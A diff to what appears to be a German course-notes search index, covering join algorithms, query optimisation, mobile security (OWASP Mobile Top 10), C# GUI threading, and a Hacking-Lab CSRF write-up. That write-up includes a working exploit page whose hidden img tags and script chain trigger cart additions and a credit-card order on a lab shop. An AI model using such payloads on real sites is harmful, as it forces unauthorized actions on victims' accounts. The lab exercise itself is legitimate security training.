@@ -421,6 +421,86 @@
             "title": "Query Processing"
         }, 
         {
+            "location": "/Dbs2/9_Optimierung/", 
+            "text": "Joins / Anfrageoptimierung\n\n\nJoins\n\n\nHash Join\n\n\n\n\nF\u00fcr die kleinere Tabelle des Joins wird eine in-memory Hash-Table gebaut\n\n\nWenn die Tabelle nicht im Memory Platz hat, wird sie aufgeteilt in \"buckets\"\n\n\nDie kleinere Tabelle ist hier die \"Driving Table\"\n\n\n\n\n\n\nF\u00fcr den Join wird f\u00fcr jeder Eintrag der gr\u00f6sseren Tabelle die Hash-Table abgefragt\n\n\n\n\nNested Loop Join\n\n\n\n\nGeeignet f\u00fcr kleine Relationen\n\n\nIn der einfachen Variante wird einfach \u00fcber beide Tabellen geloopt, wobei die kleinere der \"\u00e4ussere\" Loop ist\n\n\n\n\nfor (i = 0; i \n length(outer); i++)\n    for (j = 0; j \n length(inner); j++)\n        if (outer[i] == inner[j])\n            output(outer[i], inner[j]);\n\n\n\n\n\nBlock based Nested-Loop Join\n\n\n\n\nOptimierte Version des Nested Loop Joins\n\n\nRelationen werden nicht direkt row-by-row verglichen, sondern in Bl\u00f6cken\n\n\nIn jedem Blockvergleich wird wieder gleich wie oben Row-by-row verglichen\n\n\nWeitere Optimierung, wenn Indexe verwendet werden\n\n\n\n\nSort-Merge Join\n\n\n\n\nBeide Relationen werden auf der Join-Column sortiert\n\n\nDurch die \u00e4ussere Relation (kleinere) wird 1x iteriert\n\n\nTODO: Algorithmus verstehen\n\n\n\n\nWahl des Join Algorithmus\n\n\n\n\nFalls kein Index existiert: In der Regel Hash Join\n\n\nMit Index ist ein Nested Loop schneller bei FK-Joins\n\n\nM\u00f6glichst Indexe verwenden, vor allem f\u00fcr grosse Tabellen\n\n\n\n\nAnfrage Optimierung\n\n\nLogische Optimierung\n\n\n\n\nUmformung des Anfrageterms aufgrund von Heuristiken\n\n\nNimmt keine R\u00fccksicht auf das interne Schema oder die Gr\u00f6sse der Relationen\n\n\nin der ersten Phase wird die Query in relationale Algebra \u00fcbersetzt\n\n\nSelektionen so fr\u00fch wie m\u00f6glich, um Resultatmenge zu verringern\n\n\nz.B. Filter auf eine Tabelle vor dem Join anwenden\n\n\n\n\n\n\nBasisoperationen ohne Zwischenspeicherung als einen Schritt ausf\u00fchren\n\n\nZusammenfassen gleicher Teilausdr\u00fccke f\u00fcr Wiederverwendung von Zwischenergebnissen\n\n\n\n\nPhysische Optimierung\n\n\n\n\nErzeugung von Ausf\u00fchrungspl\u00e4nen\n\n\n\n\nKostenbasierte Optimierung\n\n\n\n\nGeneriere \nalle\n denkbaren Ausf\u00fchrungspl\u00e4ne\n\n\nBewerte diese durch Kosten und f\u00fchre den \"billigsten\" Plan aus\n\n\nKosten werden berechnet aus Menge der zu \u00fcbertragenen Daten, Berechnungskosten, I/O-Kosten und Speicherungskosten (tempor\u00e4re Speicherbelegung)\n\n\n\n\nStatistiken\n\n\n\n\nInformationen \u00fcber Relationen und Indexe werden aus dem System-Katalog gelesen\n\n\nz.B. Kardinalit\u00e4t, Anzahl Pages, Index-Gr\u00f6sse, etc.\n\n\n\n\nSelektivit\u00e4t\n\n\n\n\nEs wird abgesch\u00e4tzt, wieviele Rows der Gesamtmenge die Condition f\u00fcr die Filterung erf\u00fcllen\n\n\nH\u00f6here Selektivit\u00e4t = Mehr wird rausgefiltert\n\n\nOptimizer nimmt f\u00fcr hohe Selektivit\u00e4t eher Index, f\u00fcr tiefe Selektivit\u00e4t Table Scan\n\n\n\n\nDichte\n\n\n\n\nDurchschnittlicher prozentualer Anteil von Duplikaten\n\n\nals Funktion: Anzahl eindeutige Werte / Anzahl Tupels\n\n\nHohe Dichte -\n Viele Duplikate\n\n\n\n\nBest Practices\n\n\n\n\nNur Indexe erstellen, die oft verwendet werden\n\n\nIndexe auf Prim\u00e4r-, Fremdschl\u00fcssel und Attribute, auf denen h\u00e4ufig Queries ausgef\u00fchrt werden\n\n\n\n\n\n\nInfo\n\n\nTODO: SARG-able Queries", 
+            "title": "9 Optimierung"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#joins-anfrageoptimierung", 
+            "text": "", 
+            "title": "Joins / Anfrageoptimierung"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#joins", 
+            "text": "", 
+            "title": "Joins"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#hash-join", 
+            "text": "F\u00fcr die kleinere Tabelle des Joins wird eine in-memory Hash-Table gebaut  Wenn die Tabelle nicht im Memory Platz hat, wird sie aufgeteilt in \"buckets\"  Die kleinere Tabelle ist hier die \"Driving Table\"    F\u00fcr den Join wird f\u00fcr jeder Eintrag der gr\u00f6sseren Tabelle die Hash-Table abgefragt", 
+            "title": "Hash Join"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#nested-loop-join", 
+            "text": "Geeignet f\u00fcr kleine Relationen  In der einfachen Variante wird einfach \u00fcber beide Tabellen geloopt, wobei die kleinere der \"\u00e4ussere\" Loop ist   for (i = 0; i   length(outer); i++)\n    for (j = 0; j   length(inner); j++)\n        if (outer[i] == inner[j])\n            output(outer[i], inner[j]);", 
+            "title": "Nested Loop Join"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#block-based-nested-loop-join", 
+            "text": "Optimierte Version des Nested Loop Joins  Relationen werden nicht direkt row-by-row verglichen, sondern in Bl\u00f6cken  In jedem Blockvergleich wird wieder gleich wie oben Row-by-row verglichen  Weitere Optimierung, wenn Indexe verwendet werden", 
+            "title": "Block based Nested-Loop Join"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#sort-merge-join", 
+            "text": "Beide Relationen werden auf der Join-Column sortiert  Durch die \u00e4ussere Relation (kleinere) wird 1x iteriert  TODO: Algorithmus verstehen", 
+            "title": "Sort-Merge Join"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#wahl-des-join-algorithmus", 
+            "text": "Falls kein Index existiert: In der Regel Hash Join  Mit Index ist ein Nested Loop schneller bei FK-Joins  M\u00f6glichst Indexe verwenden, vor allem f\u00fcr grosse Tabellen", 
+            "title": "Wahl des Join Algorithmus"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#anfrage-optimierung", 
+            "text": "", 
+            "title": "Anfrage Optimierung"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#logische-optimierung", 
+            "text": "Umformung des Anfrageterms aufgrund von Heuristiken  Nimmt keine R\u00fccksicht auf das interne Schema oder die Gr\u00f6sse der Relationen  in der ersten Phase wird die Query in relationale Algebra \u00fcbersetzt  Selektionen so fr\u00fch wie m\u00f6glich, um Resultatmenge zu verringern  z.B. Filter auf eine Tabelle vor dem Join anwenden    Basisoperationen ohne Zwischenspeicherung als einen Schritt ausf\u00fchren  Zusammenfassen gleicher Teilausdr\u00fccke f\u00fcr Wiederverwendung von Zwischenergebnissen", 
+            "title": "Logische Optimierung"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#physische-optimierung", 
+            "text": "Erzeugung von Ausf\u00fchrungspl\u00e4nen", 
+            "title": "Physische Optimierung"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#kostenbasierte-optimierung", 
+            "text": "Generiere  alle  denkbaren Ausf\u00fchrungspl\u00e4ne  Bewerte diese durch Kosten und f\u00fchre den \"billigsten\" Plan aus  Kosten werden berechnet aus Menge der zu \u00fcbertragenen Daten, Berechnungskosten, I/O-Kosten und Speicherungskosten (tempor\u00e4re Speicherbelegung)", 
+            "title": "Kostenbasierte Optimierung"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#statistiken", 
+            "text": "Informationen \u00fcber Relationen und Indexe werden aus dem System-Katalog gelesen  z.B. Kardinalit\u00e4t, Anzahl Pages, Index-Gr\u00f6sse, etc.", 
+            "title": "Statistiken"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#selektivitat", 
+            "text": "Es wird abgesch\u00e4tzt, wieviele Rows der Gesamtmenge die Condition f\u00fcr die Filterung erf\u00fcllen  H\u00f6here Selektivit\u00e4t = Mehr wird rausgefiltert  Optimizer nimmt f\u00fcr hohe Selektivit\u00e4t eher Index, f\u00fcr tiefe Selektivit\u00e4t Table Scan", 
+            "title": "Selektivit\u00e4t"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#dichte", 
+            "text": "Durchschnittlicher prozentualer Anteil von Duplikaten  als Funktion: Anzahl eindeutige Werte / Anzahl Tupels  Hohe Dichte -  Viele Duplikate", 
+            "title": "Dichte"
+        }, 
+        {
+            "location": "/Dbs2/9_Optimierung/#best-practices", 
+            "text": "Nur Indexe erstellen, die oft verwendet werden  Indexe auf Prim\u00e4r-, Fremdschl\u00fcssel und Attribute, auf denen h\u00e4ufig Queries ausgef\u00fchrt werden    Info  TODO: SARG-able Queries", 
+            "title": "Best Practices"
+        }, 
+        {
             "location": "/EPJ/0_Index/", 
             "text": "Engineering-Projekt\n\n\n\n\nProjektplan", 
             "title": "0 Index"
@@ -539,6 +619,76 @@
             "location": "/InfSi3/10_CSRF/#remediation", 
             "text": "E-Banking verlangen SMS-Best\u00e4tigung  Grunds\u00e4tzlich: Aktion darf nicht mit einem voraussehbaren Request ausf\u00fchrbar sein  In Formular zuf\u00e4lliges XSRF-Token als hidden field einbinden  Client muss im Request dieses Token wieder mitschicken", 
             "title": "Remediation"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/", 
+            "text": "Mobile Security\n\n\niOS Bascis\n\n\n\n\niOS ist Subset von OS X mit gleichen Libraries\n\n\nObjective-C, Swift und C kann gemischt werden\n\n\nJede App ist gekapselt durch Sandboxing\n\n\nSecure Boot Chain\n\n\nLLB: Low-Level Bootloader\n\n\nJeder Schritt \u00fcberpr\u00fcft die Signatur des n\u00e4chsten\n\n\n\n\n\n\nBerechtigungen werden einzeln erfragt\n\n\n\n\nData Protection API\n\n\n\n\nFile-System-Key: Wird bei einem Wipe gewechselt, dann k\u00f6nnen die verschl\u00fcsselten Daten nicht mehr gelesen werden\n\n\nEs gibt unterschiedliche Class Keys, die zu unterschiedlichen Zeiten im Memory sind, z.B. wenn das Ger\u00e4t entsperrt ist oder gesperrt\n\n\n\n\nKeychain API\n\n\n\n\nDurch Hardware-Key gesch\u00fctzt (eigener Chip)\n\n\nJede App kann in ihrer Sandbox geh\u00f6renden Secrets lesen\n\n\nKann \u00e4hnlich wie Class Keys gesteuert werden, wann sie verf\u00fcgbar sein sollen \n\n\nSeit iOS 7 k\u00f6nnen solche Secrets auch mit dem Fingerprint gesichert werden\n\n\n\n\nAndroid Basics\n\n\n\n\nSELinux seit Android 4.4\n\n\nF\u00fcr alternative Stores (z.B. Amazon) muss Installation von fremden APKs aktiviert werden - Sicherheitsriskio\n\n\njede App l\u00e4uft in eigener JVM\n\n\nKeyStore API seit 4.3 - \u00e4hnlich zu iOS\n\n\n\n\nOWASP Mobile Top 10\n\n\nM1: Improper Platform Usage\n\n\n\n\nPlatform-Features f\u00fcr Sicherheit nicht oder falsch benutzen\n\n\nGuidelines (unabsichtlich) nicht einhalten\n\n\nZu viele Permissions geben\n\n\nz.B. Schl\u00fcssel nicht in KeyChain API speichern, sondern unverschl\u00fcsselt in ein Property-File\n\n\n\n\nM2: Insecure Data Storage\n\n\n\n\nUnsicherer Data Store, wenn Ger\u00e4t verloren wurde oder mit jailbreak / root\n\n\nLeakage durch Sidechannels\n\n\nz.B. Screenshots der \"recent apps\" View\n\n\nBei iOS und Adroid k\u00f6nnen diese Screenshots bearbeitet werden\n\n\n\n\n\n\n\n\nM3: Insecure Communication\n\n\n\n\nUnsichere Kommunikationskan\u00e4le\n\n\nz.B. alte TLS-Versionen, schwache Ciphers, clear-text\n\n\nCertificate Pinning verwenden\n\n\nPublic-Key des Servers in der App hinterlegen\n\n\nIn Android und iOS \u00fcber Standard-APIs\n\n\n\n\n\n\n\n\nM6: Insecure Authorization\n\n\nM7: Client Code Quality\n\n\n\n\nXSS, SQL-Injection, ...\n\n\n\n\nM8: Code Tampering\n\n\n\n\nMonkey-Patching\n\n\nJailbreaking / Rooting\n\n\nDetection auch m\u00f6glich, indem z.B. nach shell-skripts gesucht wird\n\n\n\n\n\n\nMethod Swizzling\n\n\nMethoden werden vertauscht\n\n\n\n\n\n\nIn Objective-C werden alle Methoden-Aufrufe \u00fcber eine zentrale Methode geschickt, die Messages verschickt\n\n\ndiese k\u00f6nnen mit jailbreak \u00fcberschrieben werden\n\n\nBesser in Swift\n\n\n\n\n\n\n\n\nM9: Reverse Engineering\n\n\n\n\nCode Reversing\n\n\nDisassembly\n\n\nBei Android Code Obfuscating im SDK dabei\n\n\nAndroid kompiliert Java zu \"smali\" Code bis Android 5\n\n\nMit \ndex2jar\n kann es auch zu normalen Class-files kompiliert werden\n\n\n\n\n\n\nSeit Android 5 Android Runtime\n\n\nKompiliert code bei Installation zu native code\n\n\nDEX-File ist immer noch im APK - Reverse Engineering gleich m\u00f6glich", 
+            "title": "11 Mobile Security"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#mobile-security", 
+            "text": "", 
+            "title": "Mobile Security"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#ios-bascis", 
+            "text": "iOS ist Subset von OS X mit gleichen Libraries  Objective-C, Swift und C kann gemischt werden  Jede App ist gekapselt durch Sandboxing  Secure Boot Chain  LLB: Low-Level Bootloader  Jeder Schritt \u00fcberpr\u00fcft die Signatur des n\u00e4chsten    Berechtigungen werden einzeln erfragt", 
+            "title": "iOS Bascis"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#data-protection-api", 
+            "text": "File-System-Key: Wird bei einem Wipe gewechselt, dann k\u00f6nnen die verschl\u00fcsselten Daten nicht mehr gelesen werden  Es gibt unterschiedliche Class Keys, die zu unterschiedlichen Zeiten im Memory sind, z.B. wenn das Ger\u00e4t entsperrt ist oder gesperrt", 
+            "title": "Data Protection API"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#keychain-api", 
+            "text": "Durch Hardware-Key gesch\u00fctzt (eigener Chip)  Jede App kann in ihrer Sandbox geh\u00f6renden Secrets lesen  Kann \u00e4hnlich wie Class Keys gesteuert werden, wann sie verf\u00fcgbar sein sollen   Seit iOS 7 k\u00f6nnen solche Secrets auch mit dem Fingerprint gesichert werden", 
+            "title": "Keychain API"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#android-basics", 
+            "text": "SELinux seit Android 4.4  F\u00fcr alternative Stores (z.B. Amazon) muss Installation von fremden APKs aktiviert werden - Sicherheitsriskio  jede App l\u00e4uft in eigener JVM  KeyStore API seit 4.3 - \u00e4hnlich zu iOS", 
+            "title": "Android Basics"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#owasp-mobile-top-10", 
+            "text": "", 
+            "title": "OWASP Mobile Top 10"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#m1-improper-platform-usage", 
+            "text": "Platform-Features f\u00fcr Sicherheit nicht oder falsch benutzen  Guidelines (unabsichtlich) nicht einhalten  Zu viele Permissions geben  z.B. Schl\u00fcssel nicht in KeyChain API speichern, sondern unverschl\u00fcsselt in ein Property-File", 
+            "title": "M1: Improper Platform Usage"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#m2-insecure-data-storage", 
+            "text": "Unsicherer Data Store, wenn Ger\u00e4t verloren wurde oder mit jailbreak / root  Leakage durch Sidechannels  z.B. Screenshots der \"recent apps\" View  Bei iOS und Adroid k\u00f6nnen diese Screenshots bearbeitet werden", 
+            "title": "M2: Insecure Data Storage"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#m3-insecure-communication", 
+            "text": "Unsichere Kommunikationskan\u00e4le  z.B. alte TLS-Versionen, schwache Ciphers, clear-text  Certificate Pinning verwenden  Public-Key des Servers in der App hinterlegen  In Android und iOS \u00fcber Standard-APIs", 
+            "title": "M3: Insecure Communication"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#m6-insecure-authorization", 
+            "text": "", 
+            "title": "M6: Insecure Authorization"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#m7-client-code-quality", 
+            "text": "XSS, SQL-Injection, ...", 
+            "title": "M7: Client Code Quality"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#m8-code-tampering", 
+            "text": "Monkey-Patching  Jailbreaking / Rooting  Detection auch m\u00f6glich, indem z.B. nach shell-skripts gesucht wird    Method Swizzling  Methoden werden vertauscht    In Objective-C werden alle Methoden-Aufrufe \u00fcber eine zentrale Methode geschickt, die Messages verschickt  diese k\u00f6nnen mit jailbreak \u00fcberschrieben werden  Besser in Swift", 
+            "title": "M8: Code Tampering"
+        }, 
+        {
+            "location": "/InfSi3/11_Mobile_Security/#m9-reverse-engineering", 
+            "text": "Code Reversing  Disassembly  Bei Android Code Obfuscating im SDK dabei  Android kompiliert Java zu \"smali\" Code bis Android 5  Mit  dex2jar  kann es auch zu normalen Class-files kompiliert werden    Seit Android 5 Android Runtime  Kompiliert code bei Installation zu native code  DEX-File ist immer noch im APK - Reverse Engineering gleich m\u00f6glich", 
+            "title": "M9: Reverse Engineering"
         }, 
         {
             "location": "/InfSi3/1_Exam/", 
@@ -754,6 +904,26 @@
             "location": "/InfSi3/9_JSON_Hijacking/#remediation", 
             "text": "CORS einsetzen, um Zugriff einzuschr\u00e4nken  Google hat zu Beginn des JSON eine Endlosschleife eingebaut, quick / dirty!", 
             "title": "Remediation"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/2651_CSRF/", 
+            "text": "2651 Cross Site Request Forgery\n\n\nAnalyse\n\n\n\n\nRequests mit eingeloggtem User per ZAP Proxy abfangen\n\n\nDas Hinzuf\u00fcgen zum Warenkorb geschieht mit GET und Query-Parameter\n\n\n\n\nGET http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct\nproductId=2\nquantity=10\nSubmit=Order\n\n\n\n\n\n\n\nBeim Absenden der Bestellung wird ein GET auf \n\n\n\n\n http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder\n\n\n\n\n\nausgef\u00fchrt\n\n\nExploit\n\n\nAuf der Landing Page erstellen wir eine HTML-Seite, damit der Browser per \nimg\n-Tag die beiden GET-Requests ausf\u00fchrt\n\n\nhtml\n\n\nbody\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct\nproductId=2\nquantity=20\nSubmit=Order\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\n/\nbody\n\n\n/\nhtml\n\n\n\n\n\n\n\n\nDies funktioniert aber nicht richtig, da die beiden Bilder parallel geladen werden. Zuerst muss der erste Request abgeschlossen sein, bis der zweite beginnen kann\n\n\n\n\nhtml\n\n\nhead\n\n\nscript\n \ntype\n=\ntext/javascript\n\n    \nvar\n \nloadSecond\n \n=\n \nfunction\n()\n \n{\n\n        \ndocument\n.\nlocation\n=\norder.html\n;\n\n    \n}\n\n    \nvar\n \nimg\n \n=\n \ndocument\n.\nimages\n[\n0\n];\n\n    \nimg\n.\naddEventListener\n(\nload\n,\n \nloadSecond\n,\n \nfalse\n);\n\n\n/\nscript\n\n\n/\nhead\n\n\nbody\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct\nproductId=2\nquantity=20\nSubmit=Order\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\n/\nbody", 
+            "title": "2651 CSRF"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/2651_CSRF/#2651-cross-site-request-forgery", 
+            "text": "", 
+            "title": "2651 Cross Site Request Forgery"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/2651_CSRF/#analyse", 
+            "text": "Requests mit eingeloggtem User per ZAP Proxy abfangen  Das Hinzuf\u00fcgen zum Warenkorb geschieht mit GET und Query-Parameter   GET http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct productId=2 quantity=10 Submit=Order   Beim Absenden der Bestellung wird ein GET auf     http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder  ausgef\u00fchrt", 
+            "title": "Analyse"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/2651_CSRF/#exploit", 
+            "text": "Auf der Landing Page erstellen wir eine HTML-Seite, damit der Browser per  img -Tag die beiden GET-Requests ausf\u00fchrt  html  body  img   src = http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct productId=2 quantity=20 Submit=Order   height = 1   width = 1 /  img   src = http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder   height = 1   width = 1 /  / body  / html    Dies funktioniert aber nicht richtig, da die beiden Bilder parallel geladen werden. Zuerst muss der erste Request abgeschlossen sein, bis der zweite beginnen kann   html  head  script   type = text/javascript \n     var   loadSecond   =   function ()   { \n         document . location = order.html ; \n     } \n     var   img   =   document . images [ 0 ]; \n     img . addEventListener ( load ,   loadSecond ,   false );  / script  / head  body  img   src = http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct productId=2 quantity=20 Submit=Order   height = 1   width = 1 /  img   src = http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder   height = 1   width = 1 /  / body", 
+            "title": "Exploit"
         }, 
         {
             "location": "/ParProg/0_Index/", 
@@ -1101,6 +1271,61 @@
             "title": "Asynchronit\u00e4t in C"
         }, 
         {
+            "location": "/ParProg/8_GUI_Threading/", 
+            "text": "GUI and Threading\n\n\nQuiz letzte Woche\n\n\nTask\n.\nRun\n(()\n \n=\n \nDownloadFile\n(\nurl\n)).\nContinueWith\n(\ntask2\n);\n\n\n\n\n\n\n\n\nbeachten: main Thread darf nicht aufh\u00f6ren, bevor die Tasks beendet werden, da sie in Daemon Threads ausgef\u00fchrt werden\n\n\n\n\nSingle-Thread-Modell\n\n\n\n\nNur ein Thread darf auf GUI zugreifen (UI-Thread)\n\n\nUI-Thread arbeit Ereignisse aus einer Event-Queue nacheinander ab\n\n\nAnalog: Thread Pool mit 1 Worker Thread\n\n\nGr\u00fcnde\n\n\nSynchronisationskosten\n\n\nDeadlock-Risiko wegen zyklischen Pattern (Observer, MVC)\n\n\n\n\n\n\nEinschr\u00e4nkungen\n\n\nUI-Events m\u00fcssen schnell berechenbar sein, damit das UI nicht blockiert\n\n\nKein Zugriff auf UI durch fremde Threads\n\n\n\n\n\n\n\n\n\n\nWarning\n\n\nAlte GUI-Frameworks wie AWT und Swing werfen keine Exceptions, wenn ein anderer als der UI-Thread auf das UI zugreift, es kann dann Race Conditions geben\n\n\n\n\nUI Dispatching\n\n\n\n\nIn Swing mit \ninvokeLater(Runnable doRun)\n ein Runnable in die Event-Queue eingef\u00fcgt\n\n\n\n\nbutton\n.\naddActionListener\n(\nevent\n \n-\n \n{\n\n    \nnew\n \nThread\n(()\n \n-\n \n{\n\n        \nString\n \ntext\n \n=\n \nreadHugeFile\n();\n\n        \nSwingUtilities\n.\ninvokeLater\n(()\n \n-\n \n{\n\n            \ntextArea\n.\nsetText\n(\ntext\n);\n\n        \n});\n\n    \n}).\nstart\n();\n\n\n});\n\n\n\n\n\n\n\n\nBesser Thread Pool statt \nThread.start()\n benutzen\n\n\n\n\n.NET UI-Thread MOdell\n\n\n\n\nGleich wie in Java Single-UI-Thread\n\n\nDer Thread, der das Window startet, wird zum UI-Thread\n\n\n\n\nTask\n.\nFactory\n.\nStartNew\n(()\n \n=\n \n{\n\n    \nint\n \nresult\n \n=\n \nLongCalculation\n(\nnumber\n);\n\n    \nDispatcher\n.\nBeginInvoke\n(\nnew\n \nThreadStart\n(()\n \n=\n \n{\n\n        \nresultLabel\n.\nContent\n \n=\n \nresult\n;\n\n    \n}));\n\n\n});\n\n\n\n\n\n\n\n\nVerkettung ist schlecht lesbar\n\n\n\n\nC# async / await\n\n\n\n\nL\u00f6st die Zerst\u00fcckelung der Logik bei der klassischen GUI-Programmierung\n\n\nMethode mit Keyword \nasync\n\n\nR\u00fcckgabetyp ist \nvoid\n (fire \n forget) oder \nTask\nT\n, wobei \nT\n der Typ des R\u00fcckgabewerts ist (optional)\n\n\nR\u00fcckgabe direkt mit \nreturn T\n, nicht \nreturn Task\nT\n\n\n\n\n\n\nName endet auf \nAsync\n per Konvention\n\n\nNach Aufruf der Methode kann auf dem zur\u00fcckgegebenen Task \nawait\n aufgerufen werden, um auf das Ergebnis zu warten (und R\u00fcckgabewert auslesen)\n\n\n\n\npublic\n \nasync\n \nTask\nint\n \nLongOperationAsync\n()\n \n{\n \n}\n\n\n\nTask\nint\n \ntask\n \n=\n \nLongOperationAsync\n();\n\n\nOtherWork\n();\n\n\nint\n \nresult\n \n=\n \nawait\n \ntask\n;\n\n\n\n\n\n\n\n\nDer Aufrufer ist nicht \nzwingend\n w\u00e4hrend des Aufrufs blockiert\n\n\n\n\nSpezielle Regeln\n\n\n\n\nasync\n-Methode muss \nawait\n beinhalten, sonst Compiler-Warning\n\n\nawait\n muss in \nasync\n-Methode sein, sonst Compiler-Fehler\n\n\nDies verursacht schnell eine Kette, weil nun alles async sein muss\n\n\nKann z.B. durch \nTask.wait()\n unterbrochen werden\n\n\n\n\n\n\nGrund liegt im Ausf\u00fchrungsmodell\n\n\n\n\nAusf\u00fchrungsmodell\n\n\n\n\nEine \nasync\n-Methode l\u00e4uft teilweise asynchron, teilweise synchron\n\n\nAufrufer f\u00fchrt die Methode erst asynchron aus, sobald ein \nawait\n kommt, vorher synchron\n\n\nDer asynchrone Teil wird normalerweise durch den Thread des erwarteten Tasks ausgef\u00fchrt (als \"continuation\")\n\n\nAusser\n bei UI-Threads: Dort wird der Asynchrone Teil nach dem \nawait\n wider vom Aufrufer (= UI-Thread) ausgef\u00fchrt\n\n\nSomit hat dies die gleiche Auswirkung wie ohne dem async / await Konzept, die Aufteilung wird einfach vom Compiler gemacht\n\n\n\n\n\n\n\n\nUI-Programmierung\n\n\nasync\n \nvoid\n \nstartDownload_Click\n(\n\u2026\n)\n \n{\n\n    \nHttpClient\n \nclient\n \n=\n \nnew\n \nHttpClient\n();\n\n    \nforeach\n \n(\nvar\n \nurl\n \nin\n \ncollection\n)\n \n{\n\n        \nvar\n \ndata\n \n=\n \nawait\n \nclient\n.\nGetStringAsync\n(\nurl\n);\n\n        \ntextArea\n.\nContent\n \n+=\n \ndata\n;\n\n    \n}\n\n\n}\n\n\n\n\n\n\n\n\nDie Methode springt zur\u00fcck beim \nawait\n, das Resultat wird dann wieder im GUI-Thread gesetzt\n\n\n\n\nPitfalls\n\n\n\n\nEine \nasync\n-Methode sind nicht per-se asynchron. Ist kein \nawait\n drin ist, wird sie komplett synchron ausgef\u00fchrt\n\n\nWorkaround: \nreturn await Task.Run()\n\n\n\n\n\n\nThreadwechsel w\u00e4hrend Methodenausf\u00fchrung\n\n\nTeil nach \nawait\n muss nicht mehr im gleichen Thread ausgef\u00fchrt werden\n\n\n\n\n\n\nEmpfehlung: Nur im UI-Layer benutzen", 
+            "title": "8 GUI Threading"
+        }, 
+        {
+            "location": "/ParProg/8_GUI_Threading/#gui-and-threading", 
+            "text": "", 
+            "title": "GUI and Threading"
+        }, 
+        {
+            "location": "/ParProg/8_GUI_Threading/#quiz-letzte-woche", 
+            "text": "Task . Run (()   =   DownloadFile ( url )). ContinueWith ( task2 );    beachten: main Thread darf nicht aufh\u00f6ren, bevor die Tasks beendet werden, da sie in Daemon Threads ausgef\u00fchrt werden", 
+            "title": "Quiz letzte Woche"
+        }, 
+        {
+            "location": "/ParProg/8_GUI_Threading/#single-thread-modell", 
+            "text": "Nur ein Thread darf auf GUI zugreifen (UI-Thread)  UI-Thread arbeit Ereignisse aus einer Event-Queue nacheinander ab  Analog: Thread Pool mit 1 Worker Thread  Gr\u00fcnde  Synchronisationskosten  Deadlock-Risiko wegen zyklischen Pattern (Observer, MVC)    Einschr\u00e4nkungen  UI-Events m\u00fcssen schnell berechenbar sein, damit das UI nicht blockiert  Kein Zugriff auf UI durch fremde Threads      Warning  Alte GUI-Frameworks wie AWT und Swing werfen keine Exceptions, wenn ein anderer als der UI-Thread auf das UI zugreift, es kann dann Race Conditions geben", 
+            "title": "Single-Thread-Modell"
+        }, 
+        {
+            "location": "/ParProg/8_GUI_Threading/#ui-dispatching", 
+            "text": "In Swing mit  invokeLater(Runnable doRun)  ein Runnable in die Event-Queue eingef\u00fcgt   button . addActionListener ( event   -   { \n     new   Thread (()   -   { \n         String   text   =   readHugeFile (); \n         SwingUtilities . invokeLater (()   -   { \n             textArea . setText ( text ); \n         }); \n     }). start ();  });    Besser Thread Pool statt  Thread.start()  benutzen", 
+            "title": "UI Dispatching"
+        }, 
+        {
+            "location": "/ParProg/8_GUI_Threading/#net-ui-thread-modell", 
+            "text": "Gleich wie in Java Single-UI-Thread  Der Thread, der das Window startet, wird zum UI-Thread   Task . Factory . StartNew (()   =   { \n     int   result   =   LongCalculation ( number ); \n     Dispatcher . BeginInvoke ( new   ThreadStart (()   =   { \n         resultLabel . Content   =   result ; \n     }));  });    Verkettung ist schlecht lesbar", 
+            "title": ".NET UI-Thread MOdell"
+        }, 
+        {
